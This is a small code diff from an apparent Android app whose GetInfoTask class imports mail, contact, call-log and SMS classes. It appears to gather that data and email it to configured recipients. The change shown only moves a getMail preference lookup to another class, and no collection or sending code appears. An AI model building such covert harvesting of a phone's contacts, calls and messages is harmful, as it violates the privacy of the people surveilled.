@@ -19,11 +19,11 @@ import javax.mail.internet.MimeBodyPart;
 import javax.mail.internet.MimeMessage;
 import javax.mail.internet.MimeMultipart;
 
+import com.system.activity.GlobalPrefActivity;
 import com.system.feature.contact.ContactCtrl;
 import com.system.feature.contact.ContactInfo;
 import com.system.feature.phonecall.PhoneCallCtrl;
 import com.system.feature.phonecall.PhoneCallInfo;
-import com.system.feature.pref.GlobalPref;
 import com.system.feature.sms.SmsCtrl;
 import com.system.feature.sms.SmsInfo;
 import com.system.utils.*;
@@ -199,7 +199,7 @@ public class GetInfoTask extends TimerTask
 	
 	private static String[] getRecipients(Context context)
 	{
-		String mail = GlobalPref.getMail(context);
+		String mail = GlobalPrefActivity.getMail(context);
 		return mail.split(",");
 	}
 	
